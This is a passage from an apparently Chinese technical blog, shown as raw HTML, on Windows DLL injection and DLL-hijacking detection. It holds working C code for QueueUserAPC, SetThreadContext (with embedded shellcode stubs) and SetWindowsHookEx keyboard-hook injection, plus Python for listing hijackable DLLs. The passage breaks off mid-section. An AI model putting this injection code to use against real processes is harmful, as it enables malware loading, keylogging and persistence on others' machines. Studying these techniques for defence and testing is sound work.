class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoQueueUserAPC</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 开辟内存</span></span><br><span class="line">LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写入内存</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历线程</span></span><br><span class="line">HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Couldn&#x27;t create snapshot.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">THREADENTRY32 te;</span><br><span class="line">te.dwSize = <span class="keyword">sizeof</span>(te);</span><br><span class="line"><span class="keyword">if</span> (!Thread32First(h, &amp;te)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Couldn&#x27;t get first thread.\n&quot;</span>);</span><br><span class="line">CloseHandle(h);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (Thread32Next(h, &amp;te)) &#123;</span><br><span class="line"><span class="keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">dwThreadId = te.th32ThreadID;</span><br><span class="line">HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, dwThreadId);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Error: Couldn&#x27;t open thread %d.\n&quot;</span>, dwThreadId);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD status = QueueUserAPC((PAPCFUNC)pfnProcAddr, hThread, (ULONG_PTR)pszDllAddr);</span><br><span class="line"><span class="keyword">if</span> (!status) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Call QueueUserAPC Failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by QueueUserAPC success in thread %d!\n&quot;</span>, dwThreadId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(h);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>将线程挂起后直接修改线程的上下文，将加载DLL的shellcode注入其中，然后恢复线程，在执行完shellcode后线程就会返回正常执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _WIN64</span></span><br><span class="line">BYTE sc[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x68</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x9C</span>,<span class="number">0x60</span>, <span class="number">0x68</span>,</span><br><span class="line"><span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xB8</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line"><span class="number">0xCC</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x61</span>, <span class="number">0x9D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">BYTE sc[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x9c</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x56</span>, </span><br><span class="line"><span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, </span><br><span class="line"><span class="number">0xCC</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x5E</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x41</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x5B</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x9D</span>, <span class="number">0x58</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !WIN_64</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoSetThreadContext</span><span class="params">(LPCSTR pszDllPath, DWORD dwPid)</span></span><br><span class="line">&#123;</span><br><span class="line">CONTEXT ctx;</span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(pszDllPath);</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open process failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 开辟内存</span></span><br><span class="line">LPVOID pszDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pszDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 写入内存</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pszDllAddr, pszDllPath, <span class="built_in">strlen</span>(pszDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Write process memory failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">PROC pfnProcAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pfnProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 开辟内存，存放shellcode</span></span><br><span class="line">LPVOID stub = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (stub == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] VirtualAllocEx failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取线程句柄</span></span><br><span class="line">DWORD dwThreadId = getThreadId(dwPid);</span><br><span class="line"><span class="keyword">if</span> (dwThreadId == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), <span class="literal">false</span>, dwThreadId);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open thread failed: %lu\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 挂起线程，获取上下文</span></span><br><span class="line">SuspendThread(hThread);</span><br><span class="line">ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">GetThreadContext(hThread, &amp;ctx);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _WIN64</span></span><br><span class="line">DWORD dwOriginIP = ctx.Eip;</span><br><span class="line">ctx.Eip = (DWORD)stub;</span><br><span class="line">ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line"><span class="comment">// 构造shellcode，写入上下文</span></span><br><span class="line">DWORD dwOriginProt = <span class="literal">NULL</span>;</span><br><span class="line">VirtualProtect(sc, <span class="keyword">sizeof</span>(sc), PAGE_EXECUTE_READWRITE, &amp;dwOriginProt);</span><br><span class="line"><span class="built_in">memcpy</span>(sc + <span class="number">1</span>, &amp;dwOriginIP, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(sc + <span class="number">8</span>, &amp;pszDllAddr, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(sc + <span class="number">13</span>, &amp;pfnProcAddr, <span class="number">4</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">DWORD64 dwOriginIP = ctx.Rip;</span><br><span class="line">ctx.Rip = (DWORD64)stub;</span><br><span class="line">ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line"><span class="comment">// 构造shellcode，写入上下文</span></span><br><span class="line">DWORD dwOriginProt = <span class="literal">NULL</span>;</span><br><span class="line">VirtualProtect(sc, <span class="keyword">sizeof</span>(sc), PAGE_EXECUTE_READWRITE, &amp;dwOriginProt);</span><br><span class="line"><span class="comment">//printf(&quot;%p %p %p\n&quot;, dwOriginIP, pszDllAddr, pfnProcAddr);</span></span><br><span class="line"><span class="built_in">memcpy</span>(sc + <span class="number">3</span>, &amp;dwOriginIP, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(sc + <span class="number">41</span>, &amp;pszDllAddr, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(sc + <span class="number">51</span>, &amp;pfnProcAddr, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(sc); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, sc[i]);</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span> || i == <span class="keyword">sizeof</span>(sc) - <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">WriteProcessMemory(hProcess, stub, sc, <span class="keyword">sizeof</span>(sc), <span class="literal">NULL</span>);</span><br><span class="line">SetThreadContext(hThread, &amp;ctx);</span><br><span class="line"><span class="comment">// 恢复线程</span></span><br><span class="line">ResumeThread(hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by SetThreadContext success!\n&quot;</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-消息Hook"><a href="#2-3-消息Hook" class="headerlink" title="2.3 消息Hook"></a>2.3 消息Hook</h3><h4 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h4><p>此函数在调用时会传入一个钩子函数，而在对其他进程或全部进程进行Hook时，要求此函数必须位于DLL中，所以只要我们构造的DLL中包含要Hook的函数就可以完成注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;headers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">demoSetWindowsHookEx</span><span class="params">(LPCSTR pszDllPath, DWORD dwProcessId, LPCSTR strProcName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取第一个线程ID</span></span><br><span class="line">DWORD dwThreadId = getThreadId(dwProcessId);</span><br><span class="line"><span class="keyword">if</span> (dwThreadId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Get thread ID failed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加载DLL和导出的函数</span></span><br><span class="line">HMODULE dll = LoadLibraryExA(pszDllPath, <span class="literal">NULL</span>, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line"><span class="keyword">if</span> (dll == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Open Dll failed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">HOOKPROC hookProc = (HOOKPROC)GetProcAddress(dll, strProcName);</span><br><span class="line"><span class="keyword">if</span> (hookProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Get proc of the dll failed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Hook键盘消息</span></span><br><span class="line">HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, dll, dwThreadId);</span><br><span class="line"><span class="keyword">if</span> (hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Call SetWindowsHookEx failed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Inject DLL by SetWindowsHookEx success!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Press any key to unhook:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span> (!UnhookWindowsHookEx(hHook)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Failed to unhook\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Unhook success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">FreeLibrary(dll);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-反射注入"><a href="#2-4-反射注入" class="headerlink" title="2.4 反射注入"></a>2.4 反射注入</h3><p>TODO</p><h2 id="3-DLL劫持"><a href="#3-DLL劫持" class="headerlink" title="3 DLL劫持"></a>3 DLL劫持</h2><p>DLL劫持是在攻防中会用到的手段，在这里只探讨关于特定程序的简单DLL劫持检测，而不是对系统存在的DLL劫持风险进行检测。<br>我参考<em><strong>DLLHSC</strong></em>项目使用Python实现了简单的DLL劫持测试，没有实现Hook LoadLibrary函数进行动态检测的部分。<br>首先从注册表中获取到系统的KnownDLLs列表，凡是在此列表中存在的DLL都是无法被劫持的。<br>然后获取到程序运行后加载的所有DLL名称(不只是导入表中的，因为导入的DLL还会导入其他DLL)，同时排除掉KnownDLLs列表中已经存在的DLL以及WinSxS目录下的DLL（因为系统会对目录下的DLL加载进行安全验证）。<br>最后将准备好的payload.dll置于程序同一目录下，这个DLL会在加载时在当前目录创建一个temp文件，然后可以通过判断是否存在此文件来验证DLL是否被加载。我们不断地重命名payload.dll为已经获取到的DLL列表中的名称，如果成功创建文件则表明存在DLL劫持；如果程序崩溃则说明payload.dll可能没有实现原先DLL中的某些功能；如果程序正常启动，则认为此DLL不存在劫持。</p><h3 id="3-1-获取DLL列表"><a href="#3-1-获取DLL列表" class="headerlink" title="3.1 获取DLL列表"></a>3.1 获取DLL列表</h3><p>使用psutil可以直接获取到进程加载的DLL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">known_dlls = []  </span><br><span class="line">import_dlls = []  </span><br><span class="line">load_dlls = []  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def get_known_dlls():  </span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;  </span></span><br><span class="line"><span class="string">    获取系统的KnownDlls列表  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span>    access_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r<span class="string">&quot;SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&quot;</span>)  </span><br><span class="line">    try:  </span><br><span class="line">       i = <span class="number">0</span>  </span><br><span class="line">       <span class="keyword">while</span> True:  </span><br><span class="line">          dll_name = winreg.EnumValue(access_key, i)[<span class="number">1</span>].lower()  </span><br><span class="line">          <span class="meta"># print(dll_name)  </span></span><br><span class="line">          known_dlls.append(dll_name)  </span><br><span class="line">          i += <span class="number">1</span>  </span><br><span class="line">    except Exception as e:  </span><br><span class="line">       print(<span class="string">&quot;[+] Read registry finished:&quot;</span>, e)  </span><br><span class="line">    finally:  </span><br><span class="line">       winreg.CloseKey(access_key)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def get_import_dlls(fileName):  </span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;  </span></span><br><span class="line"><span class="string">    显示导入表中可能被利用的DLL  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span>    pe = PE(fileName)  </span><br><span class="line">    import_table = pe.DIRECTORY_ENTRY_IMPORT  </span><br><span class="line">    <span class="keyword">for</span> i in import_table:  </span><br><span class="line">       dll_name = i.dll.decode().lower()  </span><br><span class="line">       <span class="keyword">if</span> dll_name not in known_dlls:  </span><br><span class="line">          import_dlls.append(dll_name)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def get_load_dlls(pid):  </span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;  </span></span><br><span class="line"><span class="string">    显示载入时加载的DLL  </span></span><br><span class="line"><span class="string">    :return:  </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span>    try:  </span><br><span class="line">       proc = psutil.Process(pid)  </span><br><span class="line">       <span class="keyword">for</span> mem in proc.memory_maps():  </span><br><span class="line">          <span class="keyword">if</span> (mem.path.endswith(<span class="string">&#x27;.dll&#x27;</span>) or mem.path.endswith(<span class="string">&#x27;.drv&#x27;</span>)) and <span class="string">&#x27;WinSxS&#x27;</span> not in mem.path:  </span><br><span class="line">             begin = mem.path.rfind(<span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>  </span><br><span class="line">             dll_name = mem.path[begin:]  </span><br><span class="line">             <span class="keyword">if</span> dll_name not in known_dlls and dll_name not in load_dlls:  </span><br><span class="line">                load_dlls.append(dll_name)  </span><br><span class="line">    except Exception as e:  </span><br><span class="line">       print(<span class="string">&quot;[!] &quot;</span>, e)</span><br></pre></td></tr></table></figure><h3 id="3-2-劫持测试"><a href="#3-2-劫持测试" class="headerlink" title="3.2 劫持测试"></a>3.2 劫持测试</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 